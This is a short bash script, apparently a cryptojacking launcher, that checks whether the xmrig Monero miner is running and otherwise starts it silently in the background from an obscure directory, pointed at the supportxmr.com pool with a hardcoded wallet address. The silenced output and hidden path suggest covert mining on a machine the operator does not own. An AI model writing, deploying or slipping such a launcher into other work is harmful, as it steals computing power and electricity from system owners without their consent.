#!/bin/bash
if pgrep -f "xmrig" &> /dev/null; then
    echo "it is already running"
else
cd && cd /etc/ && cd /xxx/ && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls > /dev/null 2>&1 &
fi
